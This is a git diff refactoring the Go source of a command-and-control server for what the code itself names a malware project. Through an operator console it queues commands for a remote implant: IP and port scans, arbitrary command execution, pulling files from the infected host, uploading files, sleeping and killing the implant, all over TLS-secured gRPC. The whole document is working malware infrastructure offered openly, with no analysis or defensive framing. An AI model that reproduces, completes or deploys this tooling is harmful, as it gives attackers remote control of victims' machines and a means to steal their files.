@@ -3,159 +3,170 @@ package main
 import (
 	"context"
 	"fmt"
-	"github.com/chzyer/readline"
-	"google.golang.org/grpc"
-	"google.golang.org/grpc/credentials"
-	"google.golang.org/grpc/peer"
 	"io"
 	"io/ioutil"
 	"log"
-	pb "malware/common/messages"
+	"malware/common/messages"
 	"malware/common/types"
-	"math/rand"
 	"net"
 	"os"
 	"strconv"
 	"strings"
 	"time"
+
+	"github.com/chzyer/readline"
+	"google.golang.org/grpc"
+	"google.golang.org/grpc/credentials"
+	"google.golang.org/grpc/peer"
 )
 
 type c2 struct {
-	port  int
-	queue chan *pb.CheckCmdReply
-	term  *readline.Instance
+	queue chan *messages.CheckCmdReply // Queue of commands to send to implant
+	term  *readline.Instance           // Terminal
 }
 
-func (c2 *c2) writeString(str string) {
-	log.Print(str)
-}
+// Colour constants
+const (
+	RESET = "\033[0m"
+	RED   = "\033[31m"
+)
 
-func (c2 *c2) handleReply(ip string, reply *pb.ImplantReply) {
-	log.SetPrefix("\033[31m[\033[0m" + ip + "\033[31m]\033[0m ")
+// Called when receiving a non-heartbeat message from implant
+// TODO: Should do some other stuff rather than just printing it out
+func (c2 *c2) handleReply(ip string, reply *messages.ImplantReply) {
+	log.SetPrefix(RED + "[" + RESET + ip + RED + "]" + RESET + " ")
 	if err := reply.GetError(); err != 0 {
-		c2.writeString("\033[31mError: " + types.ErrorToString[err] + "\033[0m\n")
+		log.Println(RED + "Error: " + types.ErrorToString[err] + RESET)
 	} else {
-		c2.writeString(strings.Replace(reply.String(), "\\n", "\n", -1) + "\n")
+		log.Println(strings.Replace(reply.String(), "\\n", "\n", -1) + "")
 	}
 }
 
-func (c2 *c2) CheckCommandQueue(ctx context.Context, req *pb.CheckCmdRequest) (*pb.CheckCmdReply, error) {
+// Get an IP from a grpc message context
+func get_ip(ctx context.Context) string {
+	if peer, ok := peer.FromContext(ctx); ok {
+		return peer.Addr.String()
+	} else {
+		return "no ip"
+	}
+}
+
+// Server listening function
+// Called automagically by grpc
+func (c2 *c2) CheckCommandQueue(ctx context.Context, req *messages.CheckCmdRequest) (*messages.CheckCmdReply, error) {
 	switch u := req.Message.(type) {
-	case *pb.CheckCmdRequest_Heartbeat:
+	case *messages.CheckCmdRequest_Heartbeat:
 		select {
 		case msg, ok := <-c2.queue:
 			if ok {
-				msg.RandomPadding = make([]byte, rand.Intn(100)+1)
-				rand.Read(msg.RandomPadding)
 				return msg, nil
 			} else {
-				panic("Queue closed")
+				panic("C2 Message Queue closed")
 			}
 		default:
 		}
-	case *pb.CheckCmdRequest_Reply:
-		var ip string
-		if peer, ok := peer.FromContext(ctx); ok {
-			ip = peer.Addr.String()
-		} else {
-			ip = "no ip"
-		}
-		c2.handleReply(ip, u.Reply)
+	case *messages.CheckCmdRequest_Reply:
+		c2.handleReply(get_ip(ctx), u.Reply)
 	default:
 		fmt.Println(req, u)
 		panic("Didn't received a valid message")
 	}
-	msg := &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Heartbeat{Heartbeat: time.Now().Unix()}}
-	msg.RandomPadding = make([]byte, rand.Intn(100)+1)
-	rand.Read(msg.RandomPadding)
 
-	return msg, nil
+	// We don't have anything to actually send back, so lets just reply with a heartbeat
+	return messages.C2_heartbeat(time.Now().Unix()), nil
 }
 
-func (c2 *c2) help() {
-	c2.writeString("Commands: (If module is enabled)")
-	c2.writeString("\tlist                      -> List enabled modules")
-	c2.writeString("\tportscan <ip> <from> <to> -> Scan ports")
-	c2.writeString("\texec <cmd>                -> Exec command")
-	c2.writeString("\tgetfile <filename>        -> Get file from server")
-	c2.writeString("\tputfile <local> <remote>  -> Put file from server")
-	c2.writeString("\tkill                      -> Kill the implant")
-	c2.writeString("\tsleep <seconds>           -> Sleep the implant")
+func help() {
+	log.Println("Commands: (If module is enabled)")
+	log.Println("\tlist                      -> List enabled modules")
+	log.Println("\tportscan <ip> <from> <to> -> Scan ports")
+	log.Println("\tportscan cancel           -> Cancel portscan")
+	log.Println("\tipscan <iprange>          -> Scan iprange ie: 10.0.0.1/24")
+	log.Println("\tipscan cancel             -> Cancel ipscan")
+	log.Println("\texec <cmd>                -> Exec command")
+	log.Println("\tgetfile <filename>        -> Get file from server")
+	log.Println("\tputfile <local> <remote>  -> Put file from server")
+	log.Println("\tkill                      -> Kill the implant")
+	log.Println("\tsleep <seconds>           -> Sleep the implant")
 }
 
-func (c2 *c2) handle(text string) {
+func incorrect_usage() {
+	fmt.Println("Incorrect usage")
+	help()
+}
+
+// Handle user input
+func (c2 *c2) handle_user_input(text string) {
 	parts := strings.Split(strings.TrimSpace(text), " ")
+
 	switch parts[0] {
 	case "ipscan":
 		if len(parts) != 2 {
-			fmt.Println("Incorrect usage")
-			c2.help()
+			incorrect_usage()
+			return
+		}
+		if strings.Compare("cancel", parts[1]) == 0 {
+			c2.queue <- messages.C2_ipscan_cancel()
+		} else {
+			c2.queue <- messages.C2_ipscan_range(parts[1])
+		}
+	case "portscan":
+		if len(parts) == 2 && strings.Compare("cancel", parts[1]) == 0 {
+			// Cancel the scan
+			c2.queue <- messages.C2_portscan_cancel()
 			return
 		}
 
-		message := &pb.IPScan{IpRange: parts[1]}
-		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_IpScan{IpScan: message}}
-
-	case "portscan":
 		if len(parts) != 4 {
-			fmt.Println("Incorrect usage")
-			c2.help()
+			incorrect_usage()
 			return
 		}
 		start, err := strconv.Atoi(parts[2])
 		if err != nil {
-			fmt.Println("Incorrect usage")
-			c2.help()
+			incorrect_usage()
 			return
 		}
 		end, err := strconv.Atoi(parts[3])
 		if err != nil {
-			fmt.Println("Incorrect usage")
-			c2.help()
+			incorrect_usage()
 			return
 		}
 
-		message := &pb.PortScan{Ip: parts[1], StartPort: uint32(start), EndPort: uint32(end)}
-		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Portscan{Portscan: message}}
+		c2.queue <- messages.C2_portscan_range(parts[1], uint32(start), uint32(end))
 	case "exec":
 		if len(parts) < 2 {
-			fmt.Println("Incorrect usage")
-			c2.help()
+			incorrect_usage()
 			return
 		}
-		message := &pb.Exec{Exec: parts[1], Args: parts[2:]}
-		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Exec{Exec: message}}
+
+		c2.queue <- messages.C2_exec(parts[1], parts[2:])
 	case "getfile":
 		if len(parts) != 2 {
-			fmt.Println("Incorrect usage")
-			c2.help()
+			incorrect_usage()
 			return
 		}
-		message := &pb.GetFile{Filename: parts[1]}
-		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Getfile{Getfile: message}}
+
+		c2.queue <- messages.C2_getfile(parts[1])
 	case "putfile":
 		if len(parts) != 3 {
-			fmt.Println("Incorrect usage")
-			c2.help()
+			incorrect_usage()
 			return
 		}
 		out, err := ioutil.ReadFile(parts[1])
 		if err != nil {
-			fmt.Println("Can't find file: " + parts[1])
+			fmt.Println("Can't find file: ", parts[1])
 			return
 		}
-		message := &pb.UploadFile{Filename: parts[2], Contents: out}
-		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Uploadfile{Uploadfile: message}}
+
+		c2.queue <- messages.C2_uploadfile(parts[2], out)
 	case "list":
-		message := &pb.ListModules{}
-		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Listmodules{Listmodules: message}}
+		c2.queue <- messages.C2_listmodules()
 	case "kill":
+		c2.queue <- messages.C2_kill()
 		log.Println("Killed implant")
-		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Kill{Kill: 1}}
 	case "sleep":
 		if len(parts) != 2 {
-			fmt.Println("Incorrect usage")
-			c2.help()
+			incorrect_usage()
 			return
 		}
 		seconds, err := strconv.Atoi(parts[1])
@@ -165,14 +176,15 @@ func (c2 *c2) handle(text string) {
 		}
 
 		log.Println("Implant sleeping...")
-		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Sleep{Sleep: int64(seconds)}}
+		c2.queue <- messages.C2_sleep(int64(seconds))
 	case "help":
-		c2.help()
+		help()
 	default:
-		c2.writeString("Cmd not found: " + parts[0] + "\n")
+		log.Println("Cmd not found: ", parts[0])
 	}
 }
 
+// Read user input until a ctrl+d
 func (c2 *c2) ReadUserInput() {
 	for {
 		line, err := c2.term.Readline()
@@ -182,21 +194,13 @@ func (c2 *c2) ReadUserInput() {
 			break
 		}
 
-		c2.handle(line)
+		c2.handle_user_input(line)
 
 	}
-}
-
-func filterInput(r rune) (rune, bool) {
-	switch r {
-	// block CtrlZ feature
-	case readline.CharCtrlZ:
-		return r, false
-	}
-	return r, true
 }
 
 // Function constructor - constructs new function for listing given directory
+// Used for putfile auto tabcomplete
 func listfiles(line string) []string {
 	names := make([]string, 0)
 
@@ -226,13 +230,14 @@ func listfiles(line string) []string {
 	return names
 }
 
-var completer = readline.NewPrefixCompleter(
+var completer = readline.NewPrefixCompleter( // Tab completer
 	readline.PcItem("exec"),
 	readline.PcItem("getfile"),
 	readline.PcItem("putfile", readline.PcItemDynamic(listfiles)),
-	readline.PcItem("portscan"),
-	readline.PcItem("ipscan"),
+	readline.PcItem("portscan", readline.PcItem("cancel")),
+	readline.PcItem("ipscan", readline.PcItem("cancel")),
 	readline.PcItem("kill"),
+	readline.PcItem("list"),
 	readline.PcItem("sleep"),
 	readline.PcItem("help"),
 )
@@ -250,25 +255,26 @@ func main() {
 
 	log.SetFlags(log.Ltime)
 
-	l, err := readline.NewEx(&readline.Config{
-		Prompt:          "\033[34mc2%\033[0m ",
-		HistoryFile:     "/tmp/readline.tmp",
+	reader, err := readline.NewEx(&readline.Config{
+		Prompt:          RED + "c2%" + RESET + " ",
+		HistoryFile:     "/tmp/c2_history.tmp",
 		AutoComplete:    completer,
 		InterruptPrompt: "^C",
 		EOFPrompt:       "exit",
 
-		HistorySearchFold:   true,
-		FuncFilterInputRune: filterInput,
+		HistorySearchFold: true,
 	})
 
 	if err != nil {
 		panic(err)
 	}
-	defer l.Close()
-	log.SetOutput(l.Stderr())
+	defer reader.Close()
+	log.SetOutput(reader.Stderr())
 
-	c2 := &c2{port: _C2_PORT_, queue: make(chan *pb.CheckCmdReply, 100), term: l}
-	host := fmt.Sprintf(":%d", c2.port)
+	// Will be replaced on creation from malware generation
+	c2 := &c2{queue: make(chan *messages.CheckCmdReply, 100), term: reader}
+
+	host := fmt.Sprintf(":%d", _C2_PORT_)
 	listener, err := net.Listen("tcp", host)
 
 	if err != nil {
@@ -279,13 +285,13 @@ func main() {
 
 	server := grpc.NewServer(grpc.Creds(creds))
 
-	pb.RegisterMalwareServer(server, c2)
+	messages.RegisterMalwareServer(server, c2)
 
 	go func() {
-		c2.ReadUserInput()
+		c2.ReadUserInput() // Read user input async
 		server.Stop()
 
 	}()
 	server.Serve(listener)
-	fmt.Println("Exiting")
+	fmt.Println("Exiting due to listener shutting down")
 }
